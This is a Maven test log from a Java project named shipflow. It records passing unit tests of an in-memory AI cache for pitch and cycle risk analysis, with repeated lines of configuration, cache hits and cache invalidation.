2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.317Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.317Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.317Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.318Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.318Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.318Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 2 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.318Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.319Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : All AI caches cleared
[INFO] Tests run: 2, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$CacheCleanupTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$CacheConfigurationTests
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.320Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.321Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.321Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.321Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.003 s -- in com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$CacheConfigurationTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$CycleRiskCacheTests
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.323Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.323Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: cycle risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.323Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.323Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.323Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=false, TTL=infinite)
2026-01-17T23:26:52.323Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Invalidated cache for cycle 1
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.324Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.324Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached cycle risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.324Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: cycle risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.324Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: cycle risk 1 (withAI=true, hits=2)
2026-01-17T23:26:52.324Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: cycle risk 1 (withAI=true, hits=3)
[INFO] Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.002 s -- in com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$CycleRiskCacheTests
[INFO] Running com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisCacheTest$PitchRiskCacheTests
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.325Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.325Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.325Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Updated data version for pitch 1
2026-01-17T23:26:52.325Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache invalidated due to data change: pitch 1
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=2)
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=3)
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=4)
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=5)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.326Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
2026-01-17T23:26:52.326Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=false, TTL=infinite)
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=true, hits=1)
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache hit: pitch risk 1 (withAI=false, hits=1)
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      : AI Cache Configuration:
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Master enabled: true
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Provider: in-memory
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Risk Analysis Cache:
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Pitch TTL: infinite (0=infinite)
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Cycle TTL: infinite (0=infinite)
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Invalidate on data change: true
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :   Q&A Cache:
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Enabled: true
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - TTL: 3 hours (0=infinite)
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Similarity threshold: 0.85
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.config.AICacheConfig      :     - Max entries per context: 100
2026-01-17T23:26:52.327Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : AI Cache Service initialized with provider: in-memory
2026-01-17T23:26:52.327Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 1 (withAI=true, TTL=infinite)
